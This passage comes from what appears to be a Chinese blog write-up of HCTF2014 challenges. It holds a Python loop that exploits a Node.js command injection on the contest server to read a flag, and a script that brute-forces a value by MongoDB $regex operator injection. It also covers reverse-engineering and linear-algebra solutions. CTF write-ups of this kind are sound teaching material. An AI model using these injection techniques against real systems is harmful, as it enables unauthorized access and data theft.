class="string">'pangci'</span>)) + <span class="string">' '</span> + data, <span class="function"><span class="keyword">function</span> (<span class="params">err, stdout, stderr</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123; res.end(<span class="string">'Ohhhhh MY SWEET!!!YOOOOOO HURT ME!!'</span>) &#125;</span><br><span class="line">      <span class="keyword">var</span> limit = stdout.split(<span class="string">'\n'</span>).slice(<span class="number">0</span>, <span class="number">5</span>).join(<span class="string">'\n'</span>);</span><br><span class="line">      res.end(limit);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">'HEY MY SWEET!!! I LOVE YOOOOOOOO!!!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secure</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/[^\d\-a-zA-Z ]/g</span>, <span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+<p>可以发现这里有个很明显的命令执行：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">cp.exec()</span><br></pre></td></tr></table></figure>
+<p>可直接cat数据：</p>
+<pre><code>http://121.40.86.166:39339/ac6555bfe23f5fe7e98fdcc0cd5f2451/?pangci=cat
+</code></pre><p>但是程序默认只返回命令执行结果的5行，因此写个程序来循环读取flag（通过测试flag有143行）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">outfile = open(<span class="string">'flag.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">r_url = <span class="string">'http://121.40.86.166:39339/ac6555bfe23f5fe7e98fdcc0cd5f2451/?pangci='</span></span><br><span class="line">n = <span class="number">143</span></span><br><span class="line">r = n / <span class="number">5</span> + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(r):</span><br><span class="line">    response = requests.get(r_url + <span class="string">'tail -n %s'</span> % str(n))</span><br><span class="line">    <span class="comment">#print r_url + 'tail -n %s' % str(n)</span></span><br><span class="line">    m = response.content</span><br><span class="line">    outfile.write(m + <span class="string">'\n'</span>)</span><br><span class="line">    n -= <span class="number">5</span></span><br></pre></td></tr></table></figure>
+<p>flag：<code>hctf{Ar3_you_an_op3nsourc3_1ov3r?}</code></p>
+<h2 id="LOCK（300pt）"><a href="#LOCK（300pt）" class="headerlink" title="LOCK（300pt）"></a>LOCK（300pt）</h2><p>题目是个登陆框，且注释里有tips：</p>
+<pre><code>&lt;!-- wtf!! The key is the same as lock !! Can someone help to find the right lock ?!!!--&gt;
+</code></pre><p>随即登陆，得到返回信息：</p>
+<pre><code>It seeeeeeemed the lock is not right!!!(╯°□°）╯︵ ┻━┻
+</code></pre><p>后排出普通sql注入，发现服务器上有开放27017（mongodb端口），因此开始mongodb注入尝试，通过post数据：</p>
+<pre><code>lock[$ne]=1&amp;key=2
+</code></pre><p>得到不一样的返回页面，</p>
+<pre><code>Right, but it seemmed the key is not right!!!(╯°□°）╯︵ ┻━┻(╯°□°）╯︵ ┻━┻(╯°□°）╯︵ ┻━┻
+</code></pre><p>从而判断lock变量存在mongodb注入，因lock肯定为一字符串，可以用正则来爆，程序如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vul_url = <span class="string">'http://121.40.86.166:23339'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_payload</span><span class="params">(s)</span>:</span></span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'lock[$regex]'</span>: <span class="string">r'^%s.*'</span> % s,</span><br><span class="line">        <span class="string">'key'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> post_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz_char</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment">#可加入其他可打印字符</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>:</span><br><span class="line">        payload = s + c</span><br><span class="line">        response = requests.post(vul_url, data=build_payload(payload))</span><br><span class="line">        m = re.compile(<span class="string">'Right'</span>).findall(response.content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[*] Fuzzing: "%s" [ok]'</span> % payload</span><br><span class="line">            fuzz_char(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Found $lock value: "%s"'</span> % s</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">lock = <span class="string">''</span></span><br><span class="line">fuzz_char(lock)</span><br></pre></td></tr></table></figure>
+<p>跑了一会儿，得到最终的lock值：<code>9cc32bd6</code></p>
+<p>post数据，得到flag：<br>    lock=9cc32bd6&amp;key=9cc32bd6</p>
+<p>flag：<code>hctf{Middleware_1s_al3o_Vulnerability!}</code></p>
+<h2 id="NormalFile（300pt）"><a href="#NormalFile（300pt）" class="headerlink" title="NormalFile（300pt）"></a>NormalFile（300pt）</h2><p>下载⽂文件下来 NormalFile.jpg 明显后⾯面有数据,解开之后发现__MACOSX下⾯面的同名图⽚片诡异的⼤：</p>
+<p><img src="/images/ctfs//hctf2014/NormalFile_img_1.jpeg" alt="img"></p>
+<p>然后简单分析了下,发现有个apk：</p>
+<p><img src="/images/ctfs//hctf2014/NormalFile_img_2.jpeg" alt="img"></p>
+<p>我就直接把classes.dex提出来看了,在⾥里⾯面发现了关键的验证算法，如下：</p>
+<p><img src="/images/ctfs//hctf2014/NormalFile_img_3.jpeg" alt="img"></p>
+<p>前⾯面还有⼀一部分,把两段合起来,不过我们不⽤用管,反正这个16位的就是最后的flag,分析了⼀一会,然后发现这⾥里⾯面的关系得不出唯⼀一得flag,没办法就去找其他线索,先把完整apk扣出来：</p>
+<p><img src="/images/ctfs//hctf2014/NormalFile_img_4.jpeg" alt="img"></p>
+<p>然后就是翻啊翻,许久之后,果然发现了⼀一点东⻄西：</p>
+<p><img src="/images/ctfs//hctf2014/NormalFile_img_5.jpeg" alt="img"></p>
+<p>这⾥里的“++”可以合刚刚源码⾥里的对应起来：</p>
+<p><img src="/images/ctfs//hctf2014/NormalFile_img_6.jpeg" alt="img"></p>
+<p>有了这些信息就够了,整理关系,如下：</p>
+<pre><code>0       =&apos;4&apos;        &apos;4&apos;
+1       =&apos;n&apos;        &apos;n&apos;
+2       =112^&apos;4&apos;    &apos;D&apos;
+3       =&apos;n&apos;^28     &apos;r&apos;
+4       =&apos;0&apos;        &apos;0&apos;
+5       =&apos;p&apos;^91     &apos;1&apos;
+6       =83^&apos;0&apos;     &apos;c&apos;
+7       =10=&apos;l&apos;     &apos;l&apos;
+8       =&apos;1&apos;        &apos;1&apos;
+9       =4=&apos;0&apos;      &apos;0&apos;
+10      =&apos;1&apos;^93     &apos;l&apos;
+11      =&apos;+&apos;^87     &apos;|&apos;
+12      =&apos;!&apos;        &apos;!&apos;
+13      =&apos;p&apos;        &apos;p&apos;
+14      =&apos;!&apos;^112    &apos;Q&apos;
+15      =13=&apos;p&apos;     &apos;p&apos;
+</code></pre><p>flag：<code>hctf{4nDr01cl10l|!pQp}</code></p>
+<h2 id="wow（400pt）"><a href="#wow（400pt）" class="headerlink" title="wow（400pt）"></a>wow（400pt）</h2><p>此题直接分析,基本流程是这样的:</p>
+<pre><code>输⼊入flag,⻓长度22位,每字节依次和程序⾥里⾯面保存的话按字节相乘,再相加,如图6,是部分,计算的时候会只保留字⺟母,不⾜足的补0:
+</code></pre><p><img src="/images/ctfs//hctf2014/NormalFile_img_6.jpeg" alt="img"></p>
+<p>一共有22句话，计算22次，会生成22个数，依次和程序里Verify数组保存的数比较：</p>
+<p><img src="/images/ctfs//hctf2014/wow_img_2.jpeg" alt="img"></p>
+<p>那么…flag就是解22阶的线性⽅方程组了。我偷懒⽤用了Matlab。</p>
+<pre><code>&gt;&gt;A=[
+84 , 104 , 101 , 108 , 105 , 103 , 104 , 116 , 84 , 111 , 107 , 101 , 101 , 112 , 105 , 110 , 109 , 105 , 110 , 100 , 116 , 104 , ;
+84 , 105 , 109 , 101 , 105 , 115 , 109 , 111 , 110 , 101 , 121 , 109 , 121 , 102 , 114 , 105 , 101 , 110 , 100 , 0 , 0 , 0 , ;
+87 , 101 , 108 , 99 , 111 , 109 , 101 , 116 , 111 , 116 , 104 , 101 , 97 , 117 , 103 , 101 , 114 , 82 , 117 , 105 , 77 , 97 , ;
+65 , 114 , 101 , 121 , 111 , 117 , 104 , 101 , 114 , 101 , 116 , 111 , 112 , 108 , 97 , 121 , 102 , 111 , 114 , 116 , 104 , 101 , ;
+84 , 111 , 97 , 114 , 109 , 115 , 121 , 101 , 114 , 111 , 117 , 115 , 116 , 97 , 98 , 111 , 117 , 116 , 115 , 87 , 101 , 118 , ;
+65 , 104 , 104 , 119 , 101 , 108 , 99 , 111 , 109 , 101 , 116 , 111 , 109 , 121 , 112 , 97 , 114 , 108 , 111 , 114 , 0 , 0 , ;
+83 , 108 , 97 , 121 , 116 , 104 , 101 , 109 , 105 , 110 , 116 , 104 , 101 , 109 , 97 , 115 , 116 , 101 , 114 , 115 , 110 , 97 , ;
+89 , 101 , 115 , 114 , 117 , 110 , 73 , 116 , 109 , 97 , 107 , 101 , 115 , 116 , 104 , 101 , 98 , 108 , 111 , 111 , 100 , 112 , ;
+83 , 104 , 104 , 104 , 105 , 116 , 119 , 105 , 108 , 108 , 97 , 108 , 108 , 98 , 101 , 111 , 118 , 101 , 114 , 115 , 111 , 111 , ;
+75 , 110 , 101 , 101 , 108 , 98 , 101 , 102 , 111 , 114 , 101 , 109 , 101 , 119 , 111 , 114 , 109 , 0 , 0 , 0 , 0 , 0 , ;
+82 , 117 , 110 , 119 , 104 , 105 , 108 , 101 , 121 , 111 , 117 , 115 , 116 , 105 , 108 , 108 , 99 , 97 , 110 , 0 , 0 , 0 , ;
+82 , 105 , 115 , 101 , 109 , 121 , 115 , 111 , 108 , 100 , 105 , 101 , 114 , 115 , 82 , 105 , 115 , 101 , 97 , 110 , 100 , 102 , ;
+76 , 105 , 102 , 101 , 105 , 115 , 109 , 101 , 97 , 110 , 105 , 110 , 103 , 108 , 101 , 115 , 104 , 84 , 104 , 97 , 116 , 119 , ;
+66 , 111 , 119 , 116 , 111 , 116 , 104 , 101 , 109 , 105 , 103 , 104 , 116 , 111 , 102 , 116 , 104 , 101 , 72 , 105 , 103 , 104 , ;
+84 , 104 , 101 , 102 , 105 , 114 , 115 , 116 , 107 , 105 , 108 , 108 , 103 , 111 , 101 , 115 , 116 , 111 , 109 , 101 , 65 , 110 , ;
+73 , 116 , 105 , 115 , 97 , 115 , 105 , 116 , 115 , 104 , 111 , 117 , 108 , 100 , 98 , 101 , 0 , 0 , 0 , 0 , 0 , 0 , ;
+84 , 104 , 101 , 100 , 97 , 114 , 107 , 118 , 111 , 105 , 100 , 97 , 119 , 97 , 105 , 116 , 115 , 121 , 111 , 117 , 0 , 0 , ;
+73 , 110 , 111 , 114 , 100 , 101 , 114 , 116 , 111 , 109 , 111 , 114 , 101 , 103 , 108 , 111 , 114 , 121 , 111 , 102 , 77 , 105 , ;
+82 , 101 , 109 , 101 , 109 , 98 , 101 , 114 , 116 , 104 , 101 , 115 , 117 , 110 , 116 , 104 , 101 , 119 , 101 , 108 , 108 , 111 , ;
+77 , 97 , 121 , 116 , 104 , 101 , 119 , 105 , 110 , 100 , 103 , 117 , 105 , 100 , 101 , 121 , 111 , 117 , 114 , 114 , 111 , 97 , ;
+83 , 116 , 114 , 101 , 110 , 103 , 116 , 104 , 97 , 110 , 100 , 72 , 111 , 110 , 111 , 117 , 114 , 0 , 0 , 0 , 0 , 0 , ;
+66 , 108 , 111 , 111 , 100 , 97 , 110 , 100 , 116 , 104 , 117 , 110 , 100 , 101 , 114 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , ;
+];
+&gt;&gt;b=[ 226250 , 203743 , 226551 , 234502 , 235972 , 215772 , 232456 , 232328 , 232032 , 177512 , 205937 , 228842 , 225175 , 227556 , 231174 , 167952 , 216099 , 233208 , 233001 , 234078 , 177660 , 153678 ]’;
+&gt;&gt; A\b
+</code></pre><p>结果如下：</p>
+<pre><code>ans =
+104.0000
+99.0000
+116.0000
+102.0000
+123.0000
+76.0000
+74.0000
+95.0000
+121.0000
+54.0000
+99.0000
+100.0000
+99.0000
+95.0000
+113.0000
+119.0000
+101.0000
+101.0000
+114.0000
+116.0000
+33.0000
+125.0000
+
+&gt;&gt;a=[ 104.0000, 99.0000, 116.0000, 102.0000, 123.0000, 76.0000, 74.0000, 95.0000, 121.0000, 54.0000, 99.0000, 100.0000, 99.0000, 95.0000, 113.0000, 119.0000, 101.0000, 101.0000, 114.0000, 116.0000, 33.0000, 125.0000]
+
+&gt;&gt;print &apos;&apos;.join(map(lambda x: chr(int(x)) ,a))
+</code></pre><p>flag：<code>hctf{LJ_y6cdc_qweert!}</code></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Team：0xFA"><span class="toc-number">1.</span> <span class="toc-text">Team：0xFA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#丘比龙的最爱（10pt）"><span class="toc-number"></span> <span class="toc-text">丘比龙的最爱（10pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Entry（200pt）"><span class="toc-number"></span> <span class="toc-text">Entry（200pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyCrack（100pt）"><span class="toc-number"></span> <span class="toc-text">babyCrack（100pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyCrack2（100pt）"><span class="toc-number"></span> <span class="toc-text">babyCrack2（100pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nvshen（100pt）"><span class="toc-number"></span> <span class="toc-text">nvshen（100pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IRC（300pt）"><span class="toc-number"></span> <span class="toc-text">IRC（300pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FIND（200pt）"><span class="toc-number"></span> <span class="toc-text">FIND（200pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#starbucks（400pt）"><span class="toc-number"></span> <span class="toc-text">starbucks（400pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jianshu（400pt）"><span class="toc-number"></span> <span class="toc-text">jianshu（400pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#opensource（300pt）"><span class="toc-number"></span> <span class="toc-text">opensource（300pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOCK（300pt）"><span class="toc-number"></span> <span class="toc-text">LOCK（300pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NormalFile（300pt）"><span class="toc-number"></span> <span class="toc-text">NormalFile（300pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wow（400pt）"><span class="toc-number"></span> <span class="toc-text">wow（400pt）</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2014/11/10/hctf2014-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&text=HCTF2014 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&is_video=false&description=HCTF2014 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HCTF2014 Writeup&body=Check out this article: http://rickgray.me/2014/11/10/hctf2014-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&name=HCTF2014 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
